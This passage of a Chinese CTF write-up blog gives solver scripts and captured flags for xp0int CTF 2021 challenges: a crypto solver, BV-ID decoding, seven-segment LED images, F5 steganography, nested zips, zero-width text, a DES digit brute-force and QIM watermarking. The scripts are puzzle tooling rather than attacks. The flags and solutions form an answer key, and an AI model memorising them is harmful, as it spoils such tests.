n)</span><br><span class="line">        s = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> s[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span>:</span><br><span class="line">            notPrint = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(char) &lt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">ord</span>(char) &gt; <span class="number">126</span>:</span><br><span class="line">                    notPrint = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> notPrint == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> s</span><br><span class="line">        e = gp.next_prime(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = round1() + <span class="string">&#x27; &#x27;</span> + round2() + <span class="string">&#x27; &#x27;</span> + round3() + <span class="string">&#x27; &#x27;</span> + round4()</span><br><span class="line">    <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
<p>flag：<code>flag&#123;if you miss the train I&#39;m on, You will know that I am gone&#125;</code></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122113321922.png" alt="image-20211122113321922"></p>
<p>flag: <code>flag&#123;welcome_to_xp0int_ctf_2021!!!&#125;</code></p>
<h3 id="guesssssssme"><a href="#guesssssssme" class="headerlink" title="guesssssssme"></a>guesssssssme</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">You konw:</span><br><span class="line">1GJ411x7h7=80433022=【</span><br><span class="line">19v411g7mU=251059264=A</span><br><span class="line"></span><br><span class="line">Now let&#x27;s go!</span><br><span class="line">----------------------</span><br><span class="line">1x54y1p7We</span><br><span class="line">1ah411r7ar</span><br><span class="line">1qy4y147dv</span><br><span class="line">1ox411h7JS</span><br><span class="line">1yo4y1d7UK</span><br><span class="line">1Ms411Q7q7</span><br><span class="line">1HW411Z7Nm</span><br><span class="line">1Ks411a7uU</span><br><span class="line">17J411B7a9</span><br><span class="line">1rW411x7is</span><br><span class="line">1NT4y1E7RC</span><br><span class="line">1UW411W7K3</span><br><span class="line">1GW41187mN</span><br><span class="line">1mN411Z7tA</span><br><span class="line">-----------------------</span><br><span class="line">#结果全转换成小写，并包裹flag&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>一开始以为是什么奇怪的编码，拿第一个百度了一下，震惊，居然和某个b站视频bv号一样</p>
<p>思路：这些bv号对应的视频的首字母连起来即为flag</p>
<p>其实也没几个视频，，b站一个个搜就完事了，，<del>不知道谁那么无聊还写了个脚本去爬</del></p>
<ul>
<li>bv转av：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/381784377/answer/1099438784">https://www.zhihu.com/question/381784377/answer/1099438784</a></li>
<li>爬取网页后正则匹配标题的标签</li>
</ul>
<p>不过后来发现好像直接用bv也行？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">by vvmdx</span></span><br><span class="line"><span class="string">2021/11/22 18:35</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">table=<span class="string">&#x27;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#x27;</span></span><br><span class="line">tr=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">    tr[table[i]]=i</span><br><span class="line">s=[<span class="number">11</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">xor=<span class="number">177451812</span></span><br><span class="line">add=<span class="number">8728348608</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">x</span>):</span></span><br><span class="line">    r=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        r+=tr[x[s[i]]]*<span class="number">58</span>**i</span><br><span class="line">    <span class="keyword">return</span> (r-add)^xor</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">x</span>):</span></span><br><span class="line">    x=(x^xor)+add</span><br><span class="line">    r=<span class="built_in">list</span>(<span class="string">&#x27;BV1  4 1 7  &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        r[s[i]]=table[x//<span class="number">58</span>**i%<span class="number">58</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line"></span><br><span class="line">bv=[<span class="string">&#x27;1x54y1p7We&#x27;</span>,<span class="string">&#x27;1ah411r7ar&#x27;</span>,<span class="string">&#x27;1qy4y147dv&#x27;</span>,<span class="string">&#x27;1ox411h7JS&#x27;</span>,<span class="string">&#x27;1yo4y1d7UK&#x27;</span>,<span class="string">&#x27;1Ms411Q7q7&#x27;</span>,<span class="string">&#x27;1HW411Z7Nm&#x27;</span>,<span class="string">&#x27;1Ks411a7uU&#x27;</span>,<span class="string">&#x27;17J411B7a9&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;1rW411x7is&#x27;</span>,<span class="string">&#x27;1NT4y1E7RC&#x27;</span>,<span class="string">&#x27;1UW411W7K3&#x27;</span>,<span class="string">&#x27;1GW41187mN&#x27;</span>,<span class="string">&#x27;1mN411Z7tA&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBilibili</span>(<span class="params">url</span>):</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url, headers=headers, proxies=proxies)</span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>, res.text)</span><br><span class="line">    <span class="built_in">print</span>(title)</span><br><span class="line">    <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.bilibili.com/video/&#x27;</span></span><br><span class="line">    av = []</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bv:</span><br><span class="line">        flag += getBilibili(url+<span class="string">&#x27;av&#x27;</span> + <span class="built_in">str</span>(dec(<span class="string">&#x27;BV&#x27;</span>+b)))[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag.lower() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getFlag()</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122200522070.png" alt="image-20211122200522070"></p>
<p>flag：<code>flag&#123;menggushangdan&#125;</code></p>
<h3 id="fgo"><a href="#fgo" class="headerlink" title="fgo"></a>fgo</h3><p>尝试了获取每张小图片的时间戳，结果精度不够，排不了序</p>
<p>不知道怎么做了，好在我有一个破解版ps，有一个性能还算可以的电脑，还有一个快要废了的肝</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122223450922.png" alt="image-20211122223450922"></p>
<p>拼了我3个小时吧，拼的头都裂了，蹲一个官方wp再更新</p>
<p>flag：<code>flag&#123;Fa73-Grand-Ord3r!!&#125;</code></p>
<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>题目提示led，搜了好久终于搜到相关信息：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seven-segment_display">七段式led显示器/数码管</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211124235528700.png" alt="image-20211124235528700"></p>
<p>a~g分别代表一根灯管，不同的组合代表不同的数字，先写个脚本把附件里出现的组合dump出来，写入字典（这里有个坑，文件并不完全是txt，文件头有0xff,0xfe 不知道是什么，反正用winhex去掉就完事了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LedCode</span>():</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;77777.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        a = f.read().split()</span><br><span class="line">    ledCode = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">        s = <span class="built_in">str</span>(s)[<span class="number">2</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\\x00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> s != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        	ledCode.add(s)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ledCode)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># &#123;&#x27;abcdef&#x27;, &#x27;fgcda&#x27;, &#x27;fgbc&#x27;, &#x27;afedcg&#x27;, &#x27;abc&#x27;, &#x27;abcdefg&#x27;, &#x27;afgbcd&#x27;, &#x27;abgcd&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
<p>接着按照字典，遍历文件，把七段式转换为数字，按每行512个写入文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeLed</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;77777.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        a = f.read().split()</span><br><span class="line">    ledArr=[]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">        s = <span class="built_in">str</span>(s)[<span class="number">2</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\\x00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> s != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            ledArr.append(s)</span><br><span class="line">    led = &#123;<span class="string">&#x27;afgbcd&#x27;</span>:<span class="number">9</span>,<span class="string">&#x27;fgcda&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;abcdefg&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;abcdef&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;abc&#x27;</span>:<span class="number">7</span>,<span class="string">&#x27;fgbc&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;abgcd&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;afedcg&#x27;</span>:<span class="number">6</span>&#125;</span><br><span class="line">    ledNum=[]</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;led.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> ledArr:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">512</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=f)</span><br><span class="line">        <span class="built_in">print</span>(led[code], end=<span class="string">&quot;&quot;</span>, file=f)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125002007640.png" alt="image-20211125002007640"></p>
<p>其实到这里已经勉强能看出flag了，<del>不过有的人还是太无聊</del>，写了个脚本把他对比度调高（每个七段式对应一个rgb）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">color = &#123;<span class="string">&#x27;afgbcd&#x27;</span>:(<span class="number">100</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="string">&#x27;fgcda&#x27;</span>:(<span class="number">100</span>,<span class="number">100</span>,<span class="number">0</span>),<span class="string">&#x27;abcdefg&#x27;</span>:(<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>),</span><br><span class="line">         <span class="string">&#x27;abcdef&#x27;</span>:(<span class="number">100</span>,<span class="number">0</span>,<span class="number">100</span>),<span class="string">&#x27;abc&#x27;</span>:(<span class="number">0</span>,<span class="number">100</span>,<span class="number">100</span>),<span class="string">&#x27;fgbc&#x27;</span>:(<span class="number">0</span>,<span class="number">100</span>,<span class="number">100</span>),</span><br><span class="line">         <span class="string">&#x27;abgcd&#x27;</span>:(<span class="number">0</span>,<span class="number">100</span>,<span class="number">0</span>),<span class="string">&#x27;afedcg&#x27;</span>:(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_img</span>(<span class="params">ledArr</span>):</span></span><br><span class="line">    img = np.zeros((<span class="number">69</span>, <span class="number">512</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">    ledArr = np.array(ledArr).reshape((<span class="number">69</span>,<span class="number">512</span>))</span><br><span class="line">    <span class="built_in">print</span>(ledArr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">69</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">            img[i,j] = color[ledArr[i][j]]</span><br><span class="line">    cv2.imshow(<span class="string">&quot;img&quot;</span>, img)</span><br><span class="line">    cv2.waitKey()</span><br></pre></td></tr></table></figure>
<p>执行效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125002230632.png" alt="image-20211125002230632"></p>
<p>flag：<code>flag&#123;as5d6-68t2z6-apb33-arg&#125;</code></p>
<h3 id="Eeay-C51"><a href="#Eeay-C51" class="headerlink" title="Eeay_C51"></a>Eeay_C51</h3><p>论找软件、画电路图、了解单片机运行原理、找bug整了整整一天，还在奇怪为什么那么多人把这题秒了的时候，发现1.hex文件可以直接反汇编是什么心情…..</p>
<ul>
<li><p>先用<a target="_blank" rel="noopener" href="https://lceda.cn/editor">在线仿真画图</a>（u1s1体验不错，国产之光）</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125193437731.png" alt="image-20211125193437731"></p>
<p>但是画完了不懂怎么仿真，找不到地方导入hex文件，搜了一下好像是用来仿真电路，但没办法编译程序？</p>
</li>
<li><p>后来又找了multisim直接画仿真</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125193841686.png" alt="image-20211125193841686"></p>
<p>然后在板子上导入1.hex文件跑起来，很遗憾，可能是我接线问题（别骂了别骂了）没跑出效果</p>
</li>
<li><p>最后继续搜资料，发现1.hex文件是由写在板子上的c程序编译生成的，我们知道pwn和re用ida反编译的二进制文件也是c编译生成的，，所以就把1.hex丢进ida了</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125194117246.png" alt="image-20211125194117246"></p>
</li>
</ul>
<p>好家伙，直接白学一天单片机白画一天图</p>
<p>flag：<code>flag&#123;Hi_t0_C51&#125;</code></p>
<h3 id="FFIVE"><a href="#FFIVE" class="headerlink" title="FFIVE"></a>FFIVE</h3><p>win10刷新快捷键：f5，搜索了一下 基本确定是f5隐写</p>
<p>实锤：图片头部有早期f5隐写插入的文本</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125124532608.png" alt="image-20211125124532608"></p>
<p>F5隐写解密工具：<a target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p>
<p>解密：<code>java Extract Xp0int1.jpg</code> （这不得不说我一直以为<code>-p passwd</code>是必须要的参数，试了Xp0int1、123456，还在winhex里仔细的翻有没有把密码写在里面，结果发现其实是可以没有密码的）</p>
<p>解密出output.txt，打开乱码</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125125106260.png" alt="image-20211125125106260"></p>
<p>文件头PK =&gt; zip包格式 =&gt; 改后缀 =&gt; 解压 =&gt;</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125125203953-16378159243921.png" alt="image-20211125125203953"></p>
<p>搜一下，是<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck编码</a>（注：<del>Brainfuck翻译为脑残</del>），找个在线<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck解码</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125125414369.png" alt="image-20211125125414369"></p>
<p>flag：<code>flag&#123;ad45f2-a52f3-ae956ff-ac4b2e&#125;</code></p>
<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>套了5000个zip，直接脚本跑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">un_zip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4999</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        zf = zipfile.ZipFile(<span class="string">&quot;D:\\flag\\flag&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> zf.namelist():</span><br><span class="line">            zf.extract(name, <span class="string">&quot;D:\\flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">un_zip()</span><br></pre></td></tr></table></figure>
<p>答案在flag0里面</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125161118184.png" alt="image-20211125161118184"></p>
<p>flag：<code>flag&#123;extract_extract_extract_and_4lmost_there~&#125;</code></p>
<h3 id="zero-width"><a href="#zero-width" class="headerlink" title="zero_width"></a>zero_width</h3><p>零宽字符，网上很多解析了（<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/87919817">解析1</a>、<a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/20/">解析2</a>）</p>
<p>打开flag.txt看起来什么都没有，实际上右键看属性或者丢进010或者winhex都能看到有很多东西，下图是vim查看的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126191219704.png" alt="image-20211126191219704"></p>
<p>python脚本解密（试了一些在线解密，都不太正常，这和很多因素有关，建议有本地解密脚本最好用本地解密）</p>
<p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">在线解密1</a>、<a target="_blank" rel="noopener" href="http://zero.rovelast.com/">在线解密2</a>、<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">在线解密3</a>、<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=829">在线解密4</a></p>
<p>本地脚本github：<a target="_blank" rel="noopener" href="https://github.com/enodari/zwsp-steg-py">https://github.com/enodari/zwsp-steg-py</a></p>
<p>截图好像好一点…因为复制代码的话md里零宽字符会变成一点</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126193528495.png" alt="image-20211126193528495"></p>
<p>flag：<code>flag&#123;98055234-e9e1-4c76-b1b0-fedb03d523ce&#125;</code></p>
<h3 id="boom-shakalaka"><a href="#boom-shakalaka" class="headerlink" title="boom shakalaka"></a>boom shakalaka</h3><p>给的文件提示很明显了，DES加密，CBC工作模式，PAD_PKCS5填充方式，密钥，初始向量都给了，暴破 ? 处的密文即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">92F7B9?2101134780DC5A6584025EBDAA3A182407EB3?11275D3D592808998A5CA556C88DD6228AC53C389?A4B69040A0C7045E8B9F064C89A0F1795232F4AFA17C79F5A784?6A02</span><br><span class="line"></span><br><span class="line">hint：</span><br><span class="line">DES</span><br><span class="line">CBC </span><br><span class="line">PAD_PKCS5</span><br><span class="line">key = &quot;pl2iz!z.&quot;</span><br><span class="line">iv = key</span><br></pre></td></tr></table></figure>
<p>python暴破脚本（Crypto库好像找不到填充方式的选项？pyDes库就没问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des,PAD_PKCS5,CBC,ECB</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;pl2iz!z.&#x27;</span></span><br><span class="line">iv = key</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;92F7B9&#123;&#125;2101134780DC5A6584025EBDAA3A182407EB3&#123;&#125;11275D3D592808998A5CA556C88DD6228AC53C389&#123;&#125;A4B69040A0C7045E8B9F064C89A0F1795232F4AFA17C79F5A784&#123;&#125;6A02&quot;</span></span><br><span class="line">hexStr = <span class="string">&#x27;0123456789ABCDEF&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>():</span></span><br><span class="line">    obj = des(key, CBC, iv, padmode=PAD_PKCS5)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> hexStr:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> hexStr:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> hexStr:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> hexStr:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        decStr = obj.decrypt(<span class="built_in">bytes</span>.fromhex(cipher.<span class="built_in">format</span>(i, j, k, l)))</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> decStr[:<span class="number">5</span>] == <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">and</span> decStr[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span>(decStr)</span><br><span class="line"></span><br><span class="line">dec()</span><br></pre></td></tr></table></figure>
<p>匹配出来找到正常的那个就行了</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211127094431382.png" alt="image-20211127094431382"></p>
<p>flag：<code>flag&#123;We_know_that_brute_f0rce_1s_4_go0d_method_to_hack_the_wor1d!!!&#125;</code></p>
<h3 id="EZQIM"><a href="#EZQIM" class="headerlink" title="EZQIM"></a>EZQIM</h3><ul>
<li>量化索引调制水印</li>
</ul>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">clear</span><br><span class="line"><span class="keyword">global</span> delta</span><br><span class="line"><span class="keyword">global</span> b</span><br><span class="line">delta=uint8(<span class="number">16</span>);</span><br><span class="line">b=uint8(<span class="number">2</span>);</span><br><span class="line">lena=imread(<span class="string">&quot;lena.jpg&quot;</span>);<span class="comment">% 512*512</span></span><br><span class="line">flag=imread(<span class="string">&quot;flag.jpg&quot;</span>);<span class="comment">% 512*80</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">80</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span>=<span class="number">1</span>:<span class="number">512</span></span><br><span class="line">        <span class="keyword">if</span>(flag(<span class="built_in">i</span>,<span class="built_in">j</span>)&lt;<span class="number">200</span>)</span><br><span class="line">            flag(<span class="built_in">i</span>,<span class="built_in">j</span>)=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            flag(<span class="built_in">i</span>,<span class="built_in">j</span>)=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">watermarked_lena=<span 